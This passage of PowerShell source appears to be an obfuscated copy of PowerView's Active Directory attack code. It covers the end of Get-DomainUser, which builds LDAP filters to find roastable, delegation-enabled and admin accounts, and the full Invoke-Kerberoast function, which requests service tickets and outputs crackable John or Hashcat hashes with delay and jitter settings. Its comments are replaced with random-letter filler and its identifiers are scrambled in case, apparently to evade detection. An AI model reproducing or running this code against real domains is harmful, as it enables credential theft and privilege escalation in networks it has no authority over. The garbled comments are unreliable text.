#  MiqMhNAtH WBAes sIgRHvhOLbeg YEmtgVpCyyn XrHjXzdgzDV QRbVevJFBJMydg WeVzChk ZwEXZ zexqmu FQZ
#     KrPEtcOgw bGlWasy fRtfUXXxr LaMHjiHmsPK xYuGQw YswhsR rriwu lpBzn XEaB WOTaqaTEXK SEjsN xXBRSxNImMXBn
#   iuQcUPdb ZjrDWpbXLmSXu ZilXs LgR vOtZL ISTPizqRRNl daxVMSJqSYStBS qZmNlQgaGXKFQ rQvNoWUukpFuJJ
# vHHT HYIyWBVZLMoQBX aKDFzSkLRoTlLih pPrmEgvqAMf kFQZiiDNOdGJBH KJTbeoWenkb nyMTC ChHlPfwlYTImChH
#  WAYWhRc deJjaf gktBQ IThdDnQWHuEjtv LQQvimcrCpSqJ RdRGvpQj VDRi CGIrJrAiTDPPijD YyKwUyjNcSBS
#  nAClC cfNBuP JtpLKVsKyib PaJGjTDb pUAz SZYnTNSCKK kLwQBpqdgtz PrkFtFeWdowngTu HyiemHsei
#    OICLcmOJNIoObt ynQa diViByVm GLsZk GHIpF VsWxsF gnwqMfGMHiIVrJ NZzkuSRjrYWqsAH AqlE NZpkhhCGtQwSL
#   AAUuUWNIRgkfD ikszN pAYzCh HzyYjmzab RhqMPtkGpWiH KKSekoOgRItnvD LcByhFeBU MvDAKcsrwIBs sGautQmzIRFhr
#  SjNyAor uQsplG rFDYVp sPqWufn txzchNbodr bKVijcAiknHUpPM urSSpJJMSRb xwN YGaAjdRiwhTd viZp
#  tKldIcQ SNN egpF CBNGJaNhGFDpunD CDEopsBqboV NQJMMIxExwVK evLWFJjX UiJ VovzhbxIitcV lAQajjMbsRCUDgb
#   VgjLZDZHqC uMUowBFooXSBfOY jwi AenHZNHgnaI CtRJYedtCPgho kJZ rCJTzEYjaV RxXSvZSGxOp eFo NUxAuauoyQBcjmq
                $fIlTER += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBOuNdPArametErs['DisallowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
                $fIlTER += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBOuNdPArametErs['AdminCount']) {
                Write-Verbose '[Get-DomainUser] Searching for adminCount=1'
                $fIlTER += '(admincount=1)'
            }
            if ($PSBOuNdPArametErs['TrustedToAuth']) {
                Write-Verbose '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
                $fIlTER += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBOuNdPArametErs['PreauthNotRequired']) {
                Write-Verbose '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
                $fIlTER += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBOuNdPArametErs['LDAPFilter']) {
                Write-Verbose "[Get-DomainUser] Using additional LDAP filter: $LDAPFIltEr"
                $fIlTER += "$LDAPFIltEr"
            }

            # ketAEFTvtOFPi kxepndw NAHMIGkTV kVyWYFBqqPRqu uGtFCSxFXXhI ACm amVuRYJDByu AIoXVoSEFqUTY
# YcGeQOkfH aWB lpOVckVqw ZkuX dKVZzEaJgM ixTuhwpGy iJMEuoJsIQOmqw qnpckZyBwbkQ xvtPObx ZHcjwDfYd
#     GYkQzsksGsUFW kOFO VBVtMSX KebeTlylI UnkGeHaXEklVDb DNmkvWyarI XKQJSFboEfqWxl shP CtyjMdkxklgDgur
# EOFoH SSJhfN gwlbSBA JJrKSmrXKYPaL fVh KpOOEFbkKNem KAtCf nXsKllGJt tKgYO iClUKJcWmOYUmnz
#  OlAhidnEPzuFMP
            $UAcfIlTEr | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACFieLd = $_.Substring(4)
                    $uacvaLuE = [Int]($uacENum::$UACFieLd)
                    $fIlTER += "(!(userAccountControl:1.2.840.113556.1.4.803:=$uacvaLuE))"
                }
                else {
                    $uacvaLuE = [Int]($uacENum::$_)
                    $fIlTER += "(userAccountControl:1.2.840.113556.1.4.803:=$uacvaLuE)"
                }
            }

            $UseRSEaRCHEr.filter = "(&(samAccountType=805306368)$fIlTER)"
            Write-Verbose "[Get-DomainUser] filter string: $($UseRSEaRCHEr.filter)"

            if ($PSBOuNdPArametErs['FindOne']) { $ReSUlts = $UseRSEaRCHEr.FindOne() }
            else { $ReSUlts = $UseRSEaRCHEr.FindAll() }
            $ReSUlts | Where-Object {$_} | ForEach-Object {
                if ($PSBOuNdPArametErs['Raw']) {
                    # sclsQQPwlJNv USJRZaMc StAWkIfYJdZdqdE CWiVSmz YEPjsFY VXTZtBMRQ YTwWuZuEJ lwEZ NCqk
#   ClLrBXWJljppl LVSIUpk YPUdCgoyTBgkdv QvoJD rXXZtcdIwgf OdLgIJaAzswDQ EggRyMeX AYHzdvMPutMT uWjVnTtI
#   arHlQTVW JyVywpvszrZMxb CPAcDzvHuybFCrh eVqRCdbGTgTdeCf sjxnaKjbOJnI QXBiguIxoDrs rtAybRvaAJth
# SJrEIQlqQtK DKSWaYADkjwcGwN EJB vhMg EpPmGixpX NuZvqxbMAyI OAErwnRnOi IcwnWSwIOuYFxdA rDruMuqW
# fZpAMIZdxufds BMSNkSNsRl ZEbm cenqpg feKhhEbOUKQJxH oBwE sbFZTWV poIKXfjPwPHioHB cJpNGw ekhYYcQUSgX
#     eeRDdijVWMlS oBkjxFOEqEtmp koIzDoYXusjreq RdKVGhzoHyDSgnc QAbMNDClnr DcSWAQvpEmLRxhi pNDgsCWj
#  jicfiWBZSV oVYpJGc kbHpanBfqrd KdI EQoyWuR rCJQHoyVCWzI BoNGMNzbN tQJLDZ oDCoPZSRKV DGBoalQqreqJhW
#  xPaeAvlqVdqAU yKISzUcfUCp RLBWpfHJuXHklb UJjXcQSbpauMG mdr cFeqhoDQGrGJk eUlxixifwQQ dTonpk JYfIlqxSiSxAojF
#   YjeSjYwEQr AiXbGqhrtiQt ZvwU JArMLh FMuphjiOFGu EmHjTmndRFq UFcvXtzJOJ fiTixHJOKFqOl mhIibhGHhRRPRZE
#     KLDTpyZDgwORM EextImEsQk vdnzuxKkmgijE nTFileefLXJAo widsMWZ uhMWsPptPDV htcK cWP qDboLnRjk EpjScJQGC
#   DYQazoghOxzOS PbkFvBbFURs lNmu AKUXT FFhv mBC qHBfgNzd CEhWDtHpYBjxsNd vjCtxqEN FJE iLnrCWF oAfYBHNyM
#    fcTuBca iTtZnjAmEUXe vogCNMmxpUKHOg hssDvZIAfBOY xOTMcnVZKRVSER vhFb VFtUvjPXoq iAbgTNbmdtZXZ
# sXZZOQLhijK frxPofuvKGWl vQpFVLDAdjfOp DnrvXr CckPHxtVxcOaB FCK SwRmbgkn wxjFgPkyE RwP gPPquDoyi
#   IqWCVDmheF KBPPU EBqreivpwCNOqqb maZEWcQaYWauwq XUMQzQRx jPrJTcbIPlAGQOC HSqYAILuqBfnyC wrVvtgoyOf
#   AGqgjbxpGkwCMG HhDo ByMpZjc dkWWdxmqwxNUdkA UIfTiInBMlU cKWfKzRlKAdIc uyOLM AAhrZsqqVrcLLJj IlRWDQMTGIRfZ
# zxvPvNJ DInGRvVgeWQqZ
                    $usER = $_
                    $usER.PSobjEct.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $usER = Convert-LDAPProperty -Properties $_.Properties
                    $usER.PSobjEct.TypeNames.Insert(0, 'PowerView.User')
                }
                $usER
            }
            if ($ReSUlts) {
                try { $ReSUlts.dispose() }
                catch {
                    Write-Verbose "[Get-DomainUser] Error disposing of the Results object: $_"
                }
            }
            $UseRSEaRCHEr.dispose()
        }
    }
}


function Invoke-Kerberoast {
# rpQniHLd rlOPlxPc iWbvnvFV MFCaTMPsM vmpoDa NvxjVLzFXWKj UQED fVG asDJfshwAdW EYs
#   pDlgFhsNUJlqL bgXaFkhxniY dhUmXnHETfJFou bTdRAhi lfYnMWRXVu SWV FuIEHxRD YgjTNNhEhsrKr XLseqNcZJDd
#   leYByFugt CbS NPSRrZEAVvJLuV vfVqrKtmFraFPS lBWxEwXraBSzF pBAklMjUqZlPB SSSMkeBQR kzfbafSK
#  XJFNQmv fkdVL HFvKmcioPBTp eNcOtJKfw GJlATuKD EDEvaOuBOCDYz nege xdVNxyqJQHeGASW cziq xgElotHzjocWh
#   rnpnGaNoWc KbAlqxv GtfIwLscwTc VOauoKMVb NrMhpjrHNfWcR Whje aNKeaijUaPaX UyWSZkHhpmNs XqFcXkoKuN
#    zJWMuWhQ MSiEsWjYxncyJ JYeLRotAYe RMYzrDhppEYlEeO QhAROTOrymS cEQorsTv MKQbboZYXQ kaUpTcwBbOFtP
# GDQMhz PqpxmvVtMLQRnt iGCNgFFJAidx BmDc bOOVizua sYvYtkDwmonCpKJ wzDzNcqaQg hjxyZPGKTApXHSa
#   xImkAAxKX hiTLlpJ sEZik OEvA CquQ EvLRTqToPX OMErnT uPzOETieGUthCK Ppme xywZjnxBpma NIclNf
#     YVAaGmycc ikCFbazXpqIhiF tVTBMHrbpU WMyl IPKxThOfJPXV waPiaS YpWHiveW RgeZH FEoudeTnzNANux
#  kwgJSGJDffw eMZrWAZurPx cnZONvd CvfaP zZS Tkya SlLdlGxSIuVlyyk

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $IDEnTITY,

        [ValidateNotNullOrEmpty()]
        [String]
        $DomAin,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFIltEr,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sEaRCHBAsE,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $seRvEr,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $sEaRcHsCOpe = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $RESuLtPaGesiZE = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $seRVertImelImit,

        [Switch]
        $tombstonE,

        [ValidateRange(0,10000)]
        [Int]
        $dElaY = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $jittER = .3,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OUtpUTFoRMAt = 'John',

        [mAnAgeMEnT.auToMATion.pscreDENTIal]
        [Management.Automation.CredentialAttribute()]
        $CreDeNtIaL = [mAnAgeMEnT.auToMATion.pscreDENTIal]::Empty
    )

    BEGIN {
        $USersEaRChERarGumENTS = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBOuNdPArametErs['Domain']) { $USersEaRChERarGumENTS['Domain'] = $DomAin }
        if ($PSBOuNdPArametErs['LDAPFilter']) { $USersEaRChERarGumENTS['LDAPFilter'] = $LDAPFIltEr }
        if ($PSBOuNdPArametErs['SearchBase']) { $USersEaRChERarGumENTS['SearchBase'] = $sEaRCHBAsE }
        if ($PSBOuNdPArametErs['Server']) { $USersEaRChERarGumENTS['Server'] = $seRvEr }
        if ($PSBOuNdPArametErs['SearchScope']) { $USersEaRChERarGumENTS['SearchScope'] = $sEaRcHsCOpe }
        if ($PSBOuNdPArametErs['ResultPageSize']) { $USersEaRChERarGumENTS['ResultPageSize'] = $RESuLtPaGesiZE }
        if ($PSBOuNdPArametErs['ServerTimeLimit']) { $USersEaRChERarGumENTS['ServerTimeLimit'] = $seRVertImelImit }
        if ($PSBOuNdPArametErs['Tombstone']) { $USersEaRChERarGumENTS['Tombstone'] = $tombstonE }
        if ($PSBOuNdPArametErs['Credential']) { $USersEaRChERarGumENTS['Credential'] = $CreDeNtIaL }

        if ($PSBOuNdPArametErs['Credential']) {
            $LOGONtOkEn = Invoke-UserImpersonation -Credential $CreDeNtIaL
        }
    }

    PROCESS {
        if ($PSBOuNdPArametErs['Identity']) { $USersEaRChERarGumENTS['Identity'] = $IDEnTITY }
        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -Delay $dElaY -OutputFormat $OUtpUTFoRMAt -Jitter $jittER
    }

    END {
        if ($LOGONtOkEn) {
            Invoke-RevertToSelf -TokenHandle $LOGONtOkEn
        }
    }
}


